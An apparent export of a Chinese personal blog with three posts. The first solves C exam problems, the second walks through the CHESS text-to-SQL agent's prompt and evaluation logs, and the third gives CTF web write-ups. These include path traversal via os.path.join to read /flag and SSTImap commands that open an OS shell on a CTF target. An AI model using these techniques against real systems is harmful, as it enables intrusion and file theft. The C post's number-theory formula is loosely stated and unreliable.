    "title": "一些神奇的C语言题目",
    "url": "/posts/c-in-bit/",
    "categories": "Coding",
    "tags": "c/c++, algorithm",
    "date": "2025-02-27 23:30:42 +0800",
    "content": "今天做了做2024年春季学期的C语言期末题目，恐怖如斯。OI退役已经两年多，很多代码脑子里面有想法，就是写不出来，尤其是C++转向C后，用不了STL，实在是有点不知所措。这个第二题，一眼顶针鉴定为字典树，但实际上它的数据量很小，如果用map会很快解决，但是没有如果，这里用不了map，我只能苦逼的写字典树。  (题目)[https://lexue.bit.edu.cn/mod/programming/view.php?id=484192]  输入一篇文章，以空行结束，希望统计一下其中单词出现的次数。  所谓“单词”，是仅由大写字母和/或小写字母组成的连续子串，且不区分大小写。例如，about是一个单词，a_out会被认为是a和out两个单词，about和About会被认为是同一个单词。  输出时，每个不同的单词输出一行，包括单词（全小写）和出现次数，以空格分隔。优先输出出现次数多的单词；出现次数相同的，按字典序输出。  数据范围 文章中，每个单词不超过20个字符，每行不超过80个字符，有效行数不超过100行。  #include &lt;stdio.h&gt; #include &lt;ctype.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;  #define MAX_WORD_LEN 20 #define MAX_LINE_LEN 80 #define MAX_WORD_COUNT 1000  #define lamaper 0  typedef struct TrieNode {     struct TrieNode* children[26];//有26个子节点，对应26个字母     int count; //一般为0，如果不为零就代表到这里截至有单词出现，那么这里的数字就是单词出现的次数 } TrieNode;  TrieNode* create_node() {     TrieNode* node = (TrieNode*)malloc(sizeof(TrieNode));//神奇的初始化，没有面向对象就少了很多爽点     for(int i = 0; i &lt; 26; i++){         node-&gt;children[i] = NULL;     }     node-&gt;count = 0;     return node; }  TrieNode* insert_char(TrieNode* current, char c) {     if('a' &lt;= c &amp;&amp; c &lt;= 'z'){//按照题目要求进行大小写切换         int index = c - 'a';//把字母变成数字索引         if(current-&gt;children[index] == NULL){             current-&gt;children[index] = create_node();         }         return current-&gt;children[index];     }else if ('A' &lt;= c &amp;&amp; c &lt;= 'Z'){         int index = tolower(c) - 'a';         if (current-&gt;children[index] == NULL) {             current-&gt;children[index] = create_node();         }         return current-&gt;children[index];     }     return NULL; }  typedef struct WordCount{//这个用来统计词语     char word[MAX_WORD_LEN + 1];     int count; }WordCount;  WordCount word_list[MAX_WORD_COUNT];  int word_count = 0;  void dfs(TrieNode* node, char* prefix, int len){//简单的树的前序遍历     if(node-&gt;count &gt; 0){//如果这里被截断了         strncpy(word_list[word_count].word, prefix, len);//把prefix复制到word_list[word_count].word中         word_list[word_count].word[len] = '\\0';//补加一个截断，养成好习惯         word_list[word_count].count = node-&gt;count;         word_count++;     }      for(int i = 0; i &lt; 26; i++){         if(node-&gt;children[i] != NULL){             prefix[len] = 'a' + i;//把字母加到prefix里面             prefix[len + 1] = '\\0';             dfs(node-&gt;children[i], prefix, len + 1);//len既可以理解为长度也可以理解为搜索的深度         }     } }  int compare(const void* a, const void* b){//这个是专门给qsort排序用的，qsort类似于STL的sort     WordCount* w1 = (WordCount*)a;     WordCount* w2 = (WordCount*)b;     if(w1-&gt;count != w2-&gt;count){         return w2-&gt;count - w1-&gt;count; // 出现次数多的排在前面     }else{         return strcmp(w1-&gt;word, w2-&gt;word);          //strcmp 是 C 标准库中的一个字符串比较函数，用于按字典顺序比较两个字符串     } }  signed main(){     TrieNode* root = create_node();     TrieNode* current = root;      char line[MAX_LINE_LEN + 1];       while(fgets(line, sizeof(line), stdin) != NULL){         int len = strlen(line);         if(len == 1 &amp;&amp; line[0] == '\\n'){              break;         }         for(int i = 0; i &lt; len; i++){             char c = line[i];             if(isalpha(c)){ //如果是字母                 current = insert_char(current, c);             }else{ //不是就退回根节点                 if(current != root){                      current-&gt;count++;                 }                 current = root;              }         }     }      if(current != root){         current-&gt;count++;     }      char prefix[MAX_WORD_LEN + 1];     prefix[0] = '\\0';     dfs(root, prefix, 0);      qsort(word_list, word_count, sizeof(WordCount), compare);      for(int i = 0; i &lt; word_count; i++){         printf(\"%s %d\\n\", word_list[i].word, word_list[i].count);     }       return lamaper;//防伪 }  BIT历年真是神人辈出，这些题目很有技巧性。 比如NH-02. 【选做题】Having a lunch    NH-02. 【选做题】Having a lunch    题目描述：    ​    聪明的你轻松的解开了门口的密码锁，打开了门锁，可是大门被一群饥饿的小朋友堵住的，善良的你并不想靠蛮力打开，于是打算去旁边的食品摊买点巧克力讨好小朋友。食品摊一共有六种巧克力，第一种巧克力只有一个，第二种巧克力有两个，第三种巧克力有三个，第四、五、六种巧克力均有无数个，但是你每次购买的数量必须有所限制：第四种巧克力每次购买的数量必须是1的倍数，第五种巧克力每次购买的数量必须是2的倍数，第六种巧克力每次购买的数量必须是3的倍数。你一共要买N块巧克力，你想知道你一共有多少种不同的购买方案。就算一个N也太简单了，你打算挑战一下一次性算两个。    输入格式：一行，两个整数，N1和N2，分别表示两个情况下的N。    输出格式：一行，两个用一个空格隔开的整数，分别表示当N=N1，和N=N2时候的答案。    样例输入：4 96    样例输出：34 18434    样理解释：对于N=4，记（a1,a2,a3,a4,a5,a6）表示六种巧克力的购买数量，可以知道，共有方案：    (0,0,0,0,4,0) (0,0,0,1,0,3) (0,0,0,2,2,0) (0,0,0,4,0,0) (0,0,1,0,0,3) (0,0,1,1,2,0) (0,0,1,3,0,0) (0,0,2,0,2,0) (0,0,2,2,0,0) (0,0,3,1,0,0) (0,1,0,0,0,3) (0,1,0,1,2,0) (0,1,0,3,0,0) (0,1,1,0,2,0) (0,1,1,2,0,0) (0,1,2,1,0,0) (0,1,3,0,0,0) (0,2,0,0,2,0) (0,2,0,2,0,0) (0,2,1,1,0,0) (0,2,2,0,0,0) (1,0,0,0,0,3) (1,0,0,1,2,0) (1,0,0,3,0,0) (1,0,1,0,2,0) (1,0,1,2,0,0) (1,0,2,1,0,0) (1,0,3,0,0,0) (1,1,0,0,2,0) (1,1,0,2,0,0) (1,1,1,1,0,0) (1,1,2,0,0,0) (1,2,0,1,0,0) (1,2,1,0,0,0)    数据范围：4≤N≤10^9    （买了当然自己也要吃，所以至少买四个！）    ——by smzzl   这个题第一眼看上去想搜索，但仔细看看数据范围在1E9就知道这是个时间复杂度为常数的题目。 回看这个问题，第一第二第三种巧克力的数量是确定的，所以根据组合数的结论，我们可以直接计算出这几种情况。  接下来就需要讨论第四第五第六种巧克力，这三种巧克力的数量是无限的。实际上抽象模型就是求a+2b+3c=M的非负整数解个数。 其中a、b、c分别是第四第五第六中巧克力的选择次数。如此我们可以化简公式，求a+2b=M-3c，然后设K=M-3c， 用奇妙的数论方法（丢翻图方程）可以知道，对于任意的一元二次方程ax+by=c的非负整数解个数等于=⌊ c/ab/gcd(a,b) ⌋+1， 所以我们很容易知道对于a+2b=K有（K/2）向下取整+1个非负整数解，那么只需要遍历c，再求和就行。  经过计算，这个数列求和的结果是S=(m+3)^2 + 3 / 12，所以就有如下程序。  #include&lt;stdio.h&gt;   #define int long long      int coe[7] = {1,3,5,6,5,3,1};   int cnt;      int min(int a,int b){       return (a &gt; b)? b : a ;   }      int calculate(int k){       return (k / 2) + 1;   }      int work(int n){       int cnt = 0;       for(int i = 0 ; i &lt;= min(n , 6) ; ++i){           int m = n - i;   int S =((m+3) *(m+3)+3)/12;;             cnt += S  * coe[i];                  }       return cnt;   }      signed main(){       int n1,n2;       scanf(\"%lld %lld\",&amp;n1,&amp;n2);       printf(\"%lld %lld\\n\",work(n1),work(n2));       return 0;   }         NH-3. 【选做题】Distribute    题目描述：    巧克力买来了肯定要分发呀，但是你的力气是有限的，你丢出去的糖果只能被距离你小于等于R的小朋友接到。因此你想知道，对于在某一个位置的小朋友，是否能接到你丢出去的糖果。    输入格式：    第一行一个整数T，表示数据组数    接下来T行，每行五个数，x,y,R,x0,y0，表示你的坐标(x,y)，你能丢出去的距离R，某一个小朋友的位置(x0,y0)    输出格式：    T行，每行为YES或NO，第i行表示的是对应第i组的答案。若第i组的小朋友能接到糖果，输出“YES”，否则输出“NO” （均不加引号）    样例输入：    2    0 0 1 1 1    0 0 2 1 0    样例输出：    NO    YES                         数据范围：0&lt;R&lt;100000，         x         ,         y         ,         x0         ,         y0         &lt;100000   保证所有数的最多有四位小数                  这个题需要注意的是精度问题，如何处理【四位小数】是重点。我们需要知道的是，在计算机中处理小数的难度是远大于整数的， 很容易精度丢失，因为浮点数的构造无法准确的表示很多小数。所以为了解决这个问题，我们先要把小数变成整数，然后在整数的基础上操作。  实际上我们并不真正关心二人的距离，只关心能不能到达，所以不用太在意最后距离的值正不正确。  最后要注意的是，小数乘1000为整数后，也会造成精度丢失，所以为了保持精确，我们一定要对其进行四舍五入，也就是round()  #include &lt;stdio.h&gt; #include &lt;math.h&gt;  int main() {     int T;     scanf(\"%d\", &amp;T);     while (T--) {         double x, y, R, x0, y0;         scanf(\"%lf%lf%lf%lf%lf\", &amp;x, &amp;y, &amp;R, &amp;x0, &amp;y0);                  // 将各值乘以10000并四舍五入转换为整数，保留四位小数精度         long long x_int = (long long)round(x * 10000.0);         long long y_int = (long long)round(y * 10000.0);         long long R_int = (long long)round(R * 10000.0);         long long x0_int = (long long)round(x0 * 10000.0);         long long y0_int = (long long)round(y0 * 10000.0);                  // 计算dx和dy         long long dx = x0_int - x_int;         long long dy = y0_int - y_int;                  // 计算平方距离和R的平方         long long dis_sq = dx * dx + dy * dy;         long long R_sq = R_int * R_int;                  // 比较并输出结果         printf(dis_sq &lt;= R_sq ? \"YES\\n\" : \"NO\\n\");     }     return 0; }"
  },
  
  {
    "title": "关于CHESS模型的一些学习",
    "url": "/posts/ai-sql/",
    "categories": "Blogs",
    "tags": "ai, chess",
    "date": "2025-02-19 16:24:23 +0800",
    "content": "CHESS的原理  CHESS论文：[2405.16755] CHESS: Contextual Harnessing for Efficient SQL Synthesis  CHESS 的实现过程  （1）Information Retriever (IR) - 信息检索器  从数据库模式中提取与问题相关的实体和上下文。     The Information Retriever (IR) agent aims to retrieve the relevant entities (values in the database) and context (schema descriptions provided in the database catalog). To achieve this, we present scalable and efficient methods using locality-sensitive hashing to retrieve database values from millions of rows, leveraging keyword detection, and vector databases to extract contextual information from database catalogs. Our approach utilizes both semantic and syntactic similarities between the database content and the user’s query to enhance the retrieval quality.   （2）Schema Selector (SS) - 模式选择器  进一步筛选出与问题最相关的表和列。     The goal of the Schema Selector (SS) agent is to reduce the schema size by selecting only the  necessary tables and columns required for generating the SQLquery. To achieve this, the SS agent is equipped with three tools, filter column, select tables, and select columns.   （3）Candidate Generator (CG) - 候选生成器  生成多个候选 SQL 查询。     The Candidate Generator (CG) is responsible for synthesizing SQL query that answers the question asked from the database. To accomplish this, the CG agent first calls the generate candidate query tool to generate candidate queries. It then executes these candidates on the database, checks the result, and identifies any faulty queries (those containing syntactic errors or empty result). For each faulty candidate, the agent repeatedly attempts to revise the query, until the issue is resolved or a maximum number of allowed revisions is reached.   （4）Unit Tester (UT) - 单元测试器  功能：通过自然语言单元测试评估生成的 SQL 查询。     The Unit Tester (UT) agent is responsible for selecting the most accurate SQL query from the pool of candidates generated by the CG agent. UT identifies the best candidate by 1) generating multiple unit tests that highlight differences between the candidate queries and 2) evaluating the candidates against these unit tests. It then assigns a score to each query based on the number of unit tests it passes, selecting the top-scoring candidate as the final SQL query for the given question.   实例分析  以california school 0为例，在bird测试集中:  {     \"question_id\": 0,     \"db_id\": \"california_schools\",     \"question\": \"What is the highest eligible free rate for K-12 students in the schools in Alameda County?\",     \"evidence\": \"Eligible free rate for K-12 = `Free Meal Count (K-12)` / `Enrollment (K-12)`\",     \"SQL\": \"SELECT `Free Meal Count (K-12)` / `Enrollment (K-12)` FROM frpm WHERE `County Name` = 'Alameda' ORDER BY (CAST(`Free Meal Count (K-12)` AS REAL) / `Enrollment (K-12)`) DESC LIMIT 1\",     \"difficulty\": \"simple\"   },      “question_id”是测试集问题编号，该测试集一共有1534个问题   “db_id”是数据库名称   “evidence”是给AI的提示，用于辅助生成结果   “SQL”是标准查询语句，用于获取正确的查询结果   “difficulty”是BIRD给出的问题难度评级，”simple”&lt;”moderate”&lt;”challenging”   通过california_school_0.json与california_school_0.log逐级分析：  首先用户给出提示词，在log中有记录：  ############################## Human at step revise_sql ##############################  Objective: Your objective is to make sure a query follows the database admin instructions and use the correct conditions.  Database Schema:     CREATE TABLE frpm ( \tCDSCode TEXT not null primary key, \t`Academic Year` TEXT null, \t`County Code` TEXT null, \t`District Code` INTEGER null, \t`School Code` TEXT null, \t`County Name` TEXT null, -- examples: `Alameda` \t`District Name` TEXT null, \t`School Name` TEXT null, -- examples: `Alameda County Community`, `Alameda High` \t`District Type` TEXT null, \t`School Type` TEXT null, \t`Educational Option Type` TEXT null, \t`NSLP Provision Status` TEXT null, \t`Charter School (Y/N)` INTEGER null, \t`Charter School Number` TEXT null, \t`Charter Funding Type` TEXT null, \tIRC INTEGER null, \t`Low Grade` TEXT null, \t`High Grade` TEXT null, \t`Enrollment (K-12)` REAL null, -- description: Enrollment (K-12) \t`Free Meal Count (K-12)` REAL null, -- description: Free Meal Count (K-12) \t`Percent (%) Eligible Free (K-12)` REAL null, \t`FRPM Count (K-12)` REAL null, -- description: Free or Reduced Price Meal Count (K-12) \t`Percent (%) Eligible FRPM (K-12)` REAL null, \t`Enrollment (Ages 5-17)` REAL null, -- description: Enrollment (Ages 5-17) \t`Free Meal Count (Ages 5-17)` REAL null, -- description: Free Meal Count (Ages 5-17) \t`Percent (%) Eligible Free (Ages 5-17)` REAL null, \t`FRPM Count (Ages 5-17)` REAL null, \t`Percent (%) Eligible FRPM (Ages 5-17)` REAL null, \t`2013-14 CALPADS Fall 1 Certification Status` INTEGER null, \tforeign key (CDSCode) references schools (CDSCode), );  CREATE TABLE satscores ( \tcds TEXT not null primary key, \trtype TEXT not null, \tsname TEXT null, -- examples: `Alameda High` \tdname TEXT null, -- examples: `Alameda Unified` \tcname TEXT null, -- examples: `Alameda` \tenroll12 INTEGER not null, \tNumTstTakr INTEGER not null, \tAvgScrRead INTEGER null, \tAvgScrMath INTEGER null, \tAvgScrWrite INTEGER null, \tNumGE1500 INTEGER null, \tforeign key (cds) references schools (CDSCode), );  CREATE TABLE schools ( \tCDSCode TEXT not null primary key, \tNCESDist TEXT null, \tNCESSchool TEXT null, \tStatusType TEXT not null, \tCounty TEXT not null, -- examples: `Alameda` \tDistrict TEXT not null, -- examples: `Alameda County Office of Education` \tSchool TEXT null, -- examples: `Alameda County Community`, `Alameda High` \tStreet TEXT null, \tStreetAbr TEXT null, \tCity TEXT null, -- examples: `Alameda` \tZip TEXT null, \tState TEXT null, \tMailStreet TEXT null, \tMailStrAbr TEXT null, \tMailCity TEXT null, -- examples: `Alameda` \tMailZip TEXT null, \tMailState TEXT null, \tPhone TEXT null, \tExt TEXT null, \tWebsite TEXT null, \tOpenDate DATE null, -- examples: `1997-09-01` \tClosedDate DATE null, -- examples: `1984-07-24` \tCharter INTEGER null, \tCharterNum TEXT null, \tFundingType TEXT null, \tDOC TEXT not null, \tDOCType TEXT not null, \tSOC TEXT null, \tSOCType TEXT null, \tEdOpsCode TEXT null, \tEdOpsName TEXT null, \tEILCode TEXT null, \tEILName TEXT null, \tGSoffered TEXT null, -- examples: `K-12` \tGSserved TEXT null, -- examples: `K-12` \tVirtual TEXT null, \tMagnet INTEGER null, \tLatitude REAL null, \tLongitude REAL null, \tAdmFName1 TEXT null, \tAdmLName1 TEXT null, -- examples: `Free` \tAdmEmail1 TEXT null, \tAdmFName2 TEXT null, \tAdmLName2 TEXT null, \tAdmEmail2 TEXT null, \tAdmFName3 TEXT null, \tAdmLName3 TEXT null, \tAdmEmail3 TEXT null, \tLastUpdate DATE not null, -- examples: `2015-07-01` );  Database admin instructions: 1. When you need to find the highest or lowest values based on a certain condition, using ORDER BY + LIMIT 1 is prefered over using MAX/MIN within sub queries. 2. If predicted query includes an ORDER BY clause to sort the results, you should only include the column(s) used for sorting in the SELECT clause if the question specifically ask for them. Otherwise, omit these columns from the SELECT. 3. If the question doesn't specify exactly which columns to select, between name column and id column, prefer to select id column. 4. Make sure you only output the information that is asked in the question. If the question asks for a specific column, make sure to only include that column in the SELECT clause, nothing more. 5. Predicted query should return all of the information asked in the question without any missing or extra information. 7. For key phrases mentioned in the question, we have provided the most similar values within the columns denoted by \"-- examples\" in front of the corresponding column names. This is a crucial hint indicating the correct columns to use for your SQL query. 8. No matter of how many things the question asks, you should only return one SQL query as the answer having all the information asked in the question, seperated by a comma. 9. Using || ' ' ||  to concatenate is string is banned and using that is punishable by death. Never concatenate columns in the SELECT clause. 10. If you are joining multiple tables, make sure to use alias names for the tables and use the alias names to reference the columns in the query. Use T1, T2, T3, ... as alias names. 11. If you are doing a logical operation on a column, such as mathematical operations and sorting, make sure to filter null values within those columns. 12. When ORDER BY is used, just include the column name in the ORDER BY in the SELECT clause when explicitly asked in the question. Otherwise, do not include the column name in the SELECT clause.   Value Alameda that you used in the query appears in the column City of table schools. Value Alameda that you used in the query appears in the column MailCity of table schools. Value Alameda that you used in the query appears in the column County of table schools. Value Alameda that you used in the query appears in the column cname of table satscores.    Question: What is the highest eligible free rate for K-12 students in the schools in Alameda County?  Hint: Eligible free rate for K-12 = `Free Meal Count (K-12)` / `Enrollment (K-12)`  Predicted query: SELECT MAX(CAST(`Free Meal Count (K-12)` AS REAL) / `Enrollment (K-12)`) FROM frpm WHERE `County Name` = 'Alameda'   Query result: [(1.0,)]  Please respond with a JSON object structured as follows (if the sql query is correct, return the query as it is):  {     \"chain_of_thought_reasoning\": \"Your thought process on how you arrived at the solution. You don't need to explain the instructions that are satisfied.\",     \"revised_SQL\": \"Your revised SQL query.\" }  Take a deep breath and think step by step to find the correct sqlite SQL query. If you follow all the instructions and generate the correct query, I will give you 1 million dollars.   AI通过分析用户的要求，得到如下结果：  ############################## AI at step revise_sql ##############################  {     \"chain_of_thought_reasoning\": \"To find the highest eligible free rate for K-12 students in schools located in Alameda County, we need to calculate the ratio of `Free Meal Count (K-12)` to `Enrollment (K-12)` for each school and then determine the maximum value of this ratio. The database schema indicates that these fields are located in the `frpm` table, and the county information is stored in the `County Name` column. The query filters records where `County Name` is 'Alameda' to focus on schools in Alameda County. The calculation for the eligible free rate is performed by dividing `Free Meal Count (K-12)` by `Enrollment (K-12)`, and the maximum value of this calculation is obtained using the MAX function. The query correctly handles the division by casting `Free Meal Count (K-12)` to REAL to ensure accurate division results. The query also ensures that only the maximum value of the calculated ratio is returned, adhering to the instruction to output only the information asked in the question.\",     \"revised_SQL\": \"SELECT MAX(CAST(`Free Meal Count (K-12)` AS REAL) / `Enrollment (K-12)`) FROM frpm WHERE `County Name` = 'Alameda'\" }      To find the highest eligible free rate for K-12 students in schools located in Alameda County, we need to calculate the ratio of Free Meal Count (K-12) to Enrollment (K-12) for each school and then determine the maximum value of this ratio.    The database schema indicates that these fields are located in the frpm table, and the county information is stored in the County Name column.    The query filters records where County Name is ‘Alameda’ to focus on schools in Alameda County.    The calculation for the eligible free rate is performed by dividing Free Meal Count (K-12) by Enrollment (K-12), and the maximum value of this calculation is obtained using the MAX function.    The query correctly handles the division by casting Free Meal Count (K-12) to REAL to ensure accurate division results.    The query also ensures that only the maximum value of the calculated ratio is returned, adhering to the instruction to output only the information asked in the question.   AI给出的结果写入到了revised_SQL中：  SELECT MAX(CAST(`Free Meal Count (K-12)` AS REAL) / `Enrollment (K-12)`) FROM frpm WHERE `County Name` = 'Alameda'   同一个问题会被询问2-3次，之后程序对进行评判回答是否正确：  ############################## Admin at step Evaluation ##############################  {     \"node_type\": \"evaluate_sql\",     \"evaluation_for\": \"nl_to_sql\",     \"exec_res\": 1,     \"exec_err\": \"--\",     \"Question\": \"What is the highest eligible free rate for K-12 students in the schools in Alameda County?\",     \"Evidence\": \"Eligible free rate for K-12 = `Free Meal Count (K-12)` / `Enrollment (K-12)`\",     \"GOLD_SQL\": \"SELECT `Free Meal Count (K-12)` / `Enrollment (K-12)` FROM frpm WHERE `County Name` = 'Alameda' ORDER BY (CAST(`Free Meal Count (K-12)` AS REAL) / `Enrollment (K-12)`) DESC LIMIT 1\",     \"PREDICTED_SQL\": \"SELECT MAX(CAST(`Free Meal Count (K-12)` AS REAL) / `Enrollment (K-12)`) FROM frpm WHERE `County Name` = 'Alameda' \" }  ############################## Admin at step Evaluation ##############################  {     \"node_type\": \"evaluate_sql\",     \"evaluation_for\": \"revise_sql\",     \"exec_res\": 1,     \"exec_err\": \"--\",     \"Question\": \"What is the highest eligible free rate for K-12 students in the schools in Alameda County?\",     \"Evidence\": \"Eligible free rate for K-12 = `Free Meal Count (K-12)` / `Enrollment (K-12)`\",     \"GOLD_SQL\": \"SELECT `Free Meal Count (K-12)` / `Enrollment (K-12)` FROM frpm WHERE `County Name` = 'Alameda' ORDER BY (CAST(`Free Meal Count (K-12)` AS REAL) / `Enrollment (K-12)`) DESC LIMIT 1\",     \"PREDICTED_SQL\": \"SELECT MAX(CAST(`Free Meal Count (K-12)` AS REAL) / `Enrollment (K-12)`) FROM frpm WHERE `County Name` = 'Alameda'\" }   其中：     “GOLD_SQL”是在BIRD数据集中出现的标准答案   “PREDICTED_SQL”是AI产生的答案   “exec_res”是判断结果，如果结果正确则返回1，错误则返回0   “exec_err”是产生错误的原因，如果结果正确则返回”–”   “evaluation_for”是状态，evaluation_for: nl_to_sql 表示当前评估的目标是检查自然语言到 SQL 转换的准确性；evaluation_for: revise_sql 表示当前评估的目标是检查对原始 SQL 查询的修正是否正确。   下面是一个出现错误但最后被修正的日志：  ############################## Admin at step Evaluation ##############################  {     \"node_type\": \"evaluate_sql\",     \"evaluation_for\": \"nl_to_sql\",     \"exec_res\": 0,     \"exec_err\": \"incorrect answer\",     \"Question\": \"Please list the lowest three eligible free rates for students aged 5-17 in continuation schools.\",     \"Evidence\": \"Eligible free rates for students aged 5-17 = `Free Meal Count (Ages 5-17)` / `Enrollment (Ages 5-17)`\",     \"GOLD_SQL\": \"SELECT `Free Meal Count (Ages 5-17)` / `Enrollment (Ages 5-17)` FROM frpm WHERE `Educational Option Type` = 'Continuation School' AND `Free Meal Count (Ages 5-17)` / `Enrollment (Ages 5-17)` IS NOT NULL ORDER BY `Free Meal Count (Ages 5-17)` / `Enrollment (Ages 5-17)` ASC LIMIT 3\",     \"PREDICTED_SQL\": \"SELECT T2.`Free Meal Count (Ages 5-17)` / T2.`Enrollment (Ages 5-17)` FROM schools AS T1 INNER JOIN frpm AS T2 ON T1.CDSCode = T2.CDSCode WHERE T2.`Educational Option Type` = 'Continuation School' AND T2.`Enrollment (Ages 5-17)` &gt; 0 ORDER BY T2.`Free Meal Count (Ages 5-17)` / T2.`Enrollment (Ages 5-17)` ASC LIMIT 3 \" }  ############################## Admin at step Evaluation ##############################  {     \"node_type\": \"evaluate_sql\",     \"evaluation_for\": \"revise_sql\",     \"exec_res\": 1,     \"exec_err\": \"--\",     \"Question\": \"Please list the lowest three eligible free rates for students aged 5-17 in continuation schools.\",     \"Evidence\": \"Eligible free rates for students aged 5-17 = `Free Meal Count (Ages 5-17)` / `Enrollment (Ages 5-17)`\",     \"GOLD_SQL\": \"SELECT `Free Meal Count (Ages 5-17)` / `Enrollment (Ages 5-17)` FROM frpm WHERE `Educational Option Type` = 'Continuation School' AND `Free Meal Count (Ages 5-17)` / `Enrollment (Ages 5-17)` IS NOT NULL ORDER BY `Free Meal Count (Ages 5-17)` / `Enrollment (Ages 5-17)` ASC LIMIT 3\",     \"PREDICTED_SQL\": \"SELECT T2.`Free Meal Count (Ages 5-17)` / T2.`Enrollment (Ages 5-17)` AS EligibleFreeRate FROM schools AS T1 INNER JOIN frpm AS T2 ON T1.CDSCode = T2.CDSCode WHERE T1.EdOpsName = 'Continuation School' AND T2.`Enrollment (Ages 5-17)` &gt; 0 AND T2.`Free Meal Count (Ages 5-17)` IS NOT NULL AND T2.`Enrollment (Ages 5-17)` IS NOT NULL ORDER BY EligibleFreeRate ASC LIMIT 3\" }   在所给的error_logs中，出错的回答日志被筛选出，可以通过检索chain_of_thought_reasoning查询思维链从而尝试找出失误的原因。  此外，论文从29页开始，给出了一些错误回答与错误原因：  failed_summary.json  CHESS项目给出了他们在运行BIRD测试集时产生的中间结果，存放在CHESS/results/chess_on_dev.zip at chess-v1 · ShayanTalaei/CHESS，经过合并，所有产生失误的数据被单独筛选出来，放入failed_summary.json中。  为了方便查找与定位，所有产生失误的数据都被添加了单独的标签failure_annotations，可以快速查找标签以定位问题产生的原因。  如：                  \"missing_table_status\": \"success\",                 \"missing_tables\": [],                 \"missing_column_status\": \"missing_column\",                 \"missing_columns\": [                     \"'schools'.'county'\"                 ],                 \"correct_columns\": {                     \"frpm\": [                         \"School Name\",                         \"cdscode\",                         \"High Grade\",                         \"Low Grade\"                     ],                     \"schools\": [                         \"cdscode\",                         \"county\"                     ]                 },                 \"failure_annotations\": [                     \"Field 'missing_column_status' failed with value: missing_column\"                 ]             },   产生了”missing_column”问题  又如：              {                 \"node_type\": \"nl_to_sql\",                 \"status\": \"error\",                 \"error\": \"&lt;class 'TypeError'&gt;: &lt;'NoneType' object is not subscriptable&gt;\",                 \"failure_annotations\": [                     \"Field 'status' failed with value: error\"                 ]             },   在”nl_to_sql”环节发生错误。"
  },
  
  {
    "title": "在BITs2sys刷题的一些wp",
    "url": "/posts/ctfwp/",
    "categories": "Cyber Security",
    "tags": "ctf, web",
    "date": "2025-01-24 18:35:00 +0800",
    "content": "怀着激动的心情加入了学校的CTF战队，时隔2年，再次打开NSSCTF开始刷题，心情十分复杂，以前会的现在忘了，以前不会的现在好像攻克了。但不管怎说，一段新的CTF生涯正在进行，加油吧！  [NISACTF 2022]babyupload  F12  &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=\"/upload\" method=\"post\" enctype=\"multipart/form-data\"&gt;     Select image to upload:     &lt;input type=\"file\" name=\"file\"&gt;     &lt;input type=\"submit\" value=\"Upload File\" name=\"submit\"&gt; &lt;/form&gt; &lt;!-- /source --&gt;  &lt;/body&gt;&lt;/html&gt;   转到/source查看源码  @app.route('/file/&lt;id&gt;') def file(id):     conn = db()     cur = conn.cursor()     cur.execute(\"select path from files where id=?\", (id,))     res = cur.fetchone()     if res is None:         return \"File not found\", 404      # print(res[0])      with open(os.path.join(\"uploads/\", res[0]), \"r\") as f:         return f.read()   注意到os.path.join()，发现可以利用CVE-2020-35736，重发请求，修改文件名为”/flag”  参考：     os.path.join(path, *paths) 函数用于将多个文件路径连接成一个组合的路径。第一个参数通常包含了基础路径，而之后的每个参数都被当做组件拼接到基础路径后。    然而，这个函数有一个少有人知的特性。如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将被视为绝对路径。下面的示例揭示了开发者可能遇到的这个陷阱。    def read_file(request):  filename = request.POST['filename']  file_path = os.path.join(\"var\", \"lib\", filename)  if file_path.find(\".\") != -1:      return HttpResponse(\"Failed!\")  with open(file_path) as f:      return HttpResponse(f.read(), content_type='text/plain')       在第 3 行中，我们使用 os.path.join 函数将用户输入的文件名构造出目标路径。在第 4 行中，检查生成的路径是否包含”.“，防止出现路径遍历漏洞。    但是，如果攻击者传入的文件名参数为”/a/b/c.txt“，那么第 3 行得到的变量 file_path 会是一个绝对路径（/a/b/c.txt）。即 os.path.join 会忽略掉”var/lib“部分，攻击者可以不使用“.”字符就读取到任何文件。尽管 os.path.join 的文档中描述了这种行为，但这还是导致了许多漏洞   警惕！Python 中少为人知的 10 个安全陷阱！ - 知乎  [HNCTF 2022 WEEK2]ez_SSTI  比较逆天的题，猜不到注入点是name就永远做不出来。  既然题目给了SSTI (Server Side Template Injection) - HackTricks，那就学习一些高级技法  git clone https://github.com/vladko312/SSTImap.git  cd SSTImap  pip install -r requirements.txt   然后检索一下  python sstimap.py -u \"http://node5.anna.nssctf.cn:24352/?name=1\"   得到结果可以注入，那就传一个伪shell上去  python sstimap.py -u \"http://node5.anna.nssctf.cn:24352/?name=1\" --os-shell   正常ls发现当前目录就有flag，cat以下即可。  附一个最全SSTI模板注入waf绕过总结（6700+字数！）_ssti注入绕过-CSDN博客  [LitCTF 2023]Flag点击就送！  flask的session签名伪造，需要一定玄学（猜测关键词为LitCTF）  [HNCTF 2022 WEEK3]ssssti  同week2  [GHCTF 2024 新生赛]理想国  用API构造一个用户，获得token，解析一些，发现是JWT  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEifQ.uaahZh_a2WcFPzMcnOIrefvRpAeR1LG3AlU4rz8m   {   \"header\": {     \"alg\": \"HS256\",     \"typ\": \"JWT\"   },   \"payload\": {     \"password\": \"1\",     \"username\": \"1\"   },   \"signature\": \"uaahZh_a2WcFPzMcnOIrefvRpAeR1LG3AlU4rz8m\" }   然后GET /api-base/v0/search?file=查找敏感目录。可以通过访问/proc寻找flag。     在/proc目录中，每个运行的进程都有一个以其PID（进程ID）命名的子目录。这些子目录包含了进程的详细信息，以下是一些关键文件和它们的用途：         /proc/[PID]/cmdline：显示启动该进程的命令行。     /proc/[PID]/cwd：指向进程的当前工作目录。     /proc/[PID]/exe：指向正在执行的二进制文件。     /proc/[PID]/fd/：包含该进程打开的所有文件描述符。     /proc/[PID]/stat：包含关于进程状态的详细信息，如进程状态、CPU时间等。     /proc/[PID]/status：提供进程状态的简明信息，包括内存使用、用户ID、组ID等。     /proc/[PID]/environ： 获取当前进程的环境变量信息       这些文件和目录可以用于监控和调试进程。      每一个运行的进程都存在pid，对应的在/proc就存在一个/proc/pid的目录，这个/proc/pid目录也是一个伪文件系统．通常情况下每个/proc/pid是属于运行进程的有效用户的UID和GID.但是如果一个进程的dumpable属性的值大于１，从安全角度考虑，/proc/pid的属性就是root:root.    在4.11的内核版本之前，root:root表示的是全局UID和GID 